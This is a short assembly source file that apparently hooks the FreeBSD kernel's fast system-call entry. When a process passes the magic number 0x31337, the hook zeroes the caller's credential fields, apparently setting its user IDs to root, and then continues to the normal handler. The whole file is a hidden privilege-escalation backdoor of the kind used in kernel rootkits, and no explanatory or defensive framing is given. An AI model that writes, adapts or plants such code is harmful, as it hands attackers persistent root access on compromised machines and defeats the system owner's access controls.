.p2align 4,0x90;
.globl hook_fast_syscall;
.type hook_fast_syscall,@function;
hook_fast_syscall:

	cmp $0x31337,%rax
	jne Xfast_syscall
	swapgs
	mov    %gs:0x0,%rax
	mov    %rax,-0x18(%rbp)
	mov    -0x18(%rbp),%rax
	mov    0x8(%rax),%rax
	mov    0x40(%rax),%rax
	mov    %rax,-0x10(%rbp)
	mov    -0x10(%rbp),%rax
	movl   $0x0,0x14(%rax)
	mov    -0x10(%rbp),%rax
	mov    0x14(%rax),%edx
	mov    -0x10(%rbp),%rax
	mov    %edx,0x8(%rax)
	mov    -0x10(%rbp),%rax
	mov    0x8(%rax),%edx
	mov    -0x10(%rbp),%rax
	mov    %edx,0x4(%rax)
	mov    -0x10(%rbp),%rax
	mov    0x90(%rax),%rax
	movl   $0x0,(%rax)
	swapgs
	mov    $0x1,%rax
	jmp Xfast_syscall
		

.globl hook_fast_syscall32;
.type hook_fast_syscall32,@function;
hook_fast_syscall32:
	jmp Xfast_syscall32
